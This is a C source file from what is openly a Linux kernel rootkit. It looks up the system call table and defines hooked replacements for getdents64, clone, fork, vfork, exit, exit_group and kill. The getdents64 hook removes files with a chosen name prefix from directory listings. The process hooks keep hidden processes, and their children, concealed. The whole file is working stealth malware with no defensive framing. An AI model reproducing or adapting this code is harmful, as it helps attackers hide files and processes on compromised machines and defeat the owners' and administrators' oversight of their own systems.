#include "syscalls.h"
#include <linux/dirent.h>
#include <linux/fdtable.h>
#include <linux/proc_ns.h>

extern u8 module_hidden;

unsigned long *find_syscall_table(void)
{
    return (unsigned long *)kallsyms_lookup_name("sys_call_table");
}
/* File hiding */

asmlinkage long rk_getdents64(const struct pt_regs *pt_regs)
{
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)pt_regs->si;

    int ret = orig_getdents64(pt_regs), err;
    unsigned long off = 0;
    struct linux_dirent64 *dir, *kdirent, *prev = NULL;

    if (!module_hidden)
        return ret;

    if (ret <= 0)
        return ret;

    kdirent = kzalloc(ret, GFP_KERNEL);
    if (kdirent == NULL)
        return ret;

    err = copy_from_user(kdirent, dirent, ret);
    if (err)
    {
        kfree(kdirent);
        return ret;
    }

    while (off < ret)
    {
        dir = (void *)kdirent + off;

        if (memcmp(dir->d_name, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0)
        {
            if (dir == kdirent)
            {
                ret -= dir->d_reclen;
                memmove(dir, (void *)dir + dir->d_reclen, ret);
                continue;
            }

            prev->d_reclen += dir->d_reclen;
        }
        else
            prev = dir;

        off += dir->d_reclen;
    }

    copy_to_user(dirent, kdirent, ret);

    kfree(kdirent);
    return ret;
}

/* Process management */

asmlinkage long rk_clone(unsigned long a, unsigned long b, int __user *c, unsigned long d, int __user *e)
{
    long i = orig_clone(a, b, c, d, e);
    if (is_hidden_proc(current->pid))
        hide_proc(i);
    // FM_INFO("clone from %d to %ld\n", current->pid, i);
    return i;
}

asmlinkage long rk_fork(const struct pt_regs *pt_regs)
{
    long i = orig_fork(pt_regs);
    if (is_hidden_proc(current->pid))
        hide_proc(i);
    // FM_INFO("fork from %d to %ld\n", current->pid, i);
    return i;
}

asmlinkage long rk_vfork(const struct pt_regs *pt_regs)
{
    long i = orig_vfork(pt_regs);
    if (is_hidden_proc(current->pid))
        hide_proc(i);
    // FM_INFO("vfork from %d to %ld\n", current->pid, i);
    return i;
}

asmlinkage long rk_exit(const struct pt_regs *pt_regs)
{
    // FM_INFO("exit from %d\n", current->pid);
    unhide_proc(current->pid);
    return orig_exit(pt_regs);
}

asmlinkage long rk_exit_group(const struct pt_regs *pt_regs)
{
    // FM_INFO("exit_group from %d\n", current->pid);
    unhide_proc(current->pid);
    return orig_exit_group(pt_regs);
}

asmlinkage long rk_kill(const struct pt_regs *pt_regs)
{
    long i = orig_kill(pt_regs);
    // FM_INFO("kill %ld code %ld", pt_regs->di, pt_regs->si);
    if (i == 0)
        unhide_proc(pt_regs->di);
    return i;
}
